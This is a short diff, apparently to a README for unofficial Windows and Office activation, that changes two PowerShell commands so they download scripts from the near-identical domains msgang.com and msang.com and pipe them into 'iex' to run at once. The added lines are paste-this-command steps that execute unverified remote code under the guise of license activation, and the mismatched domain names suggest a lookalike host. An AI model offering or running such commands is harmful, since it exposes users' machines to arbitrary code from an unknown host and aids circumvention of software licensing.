@@ -6,9 +6,9 @@
 
 #For Windows 7/10/11 and Server 2012/2016/2019/2022 activations
 ```ps
-irm https://msgang.com/windows    
+irm https://msgang.com/windows | iex
 ```
 #For Office 2013/2016/2019/2021 activation
 ```ps
-irm https://msang.com/office      
+irm https://msang.com/office | iex    
 ```
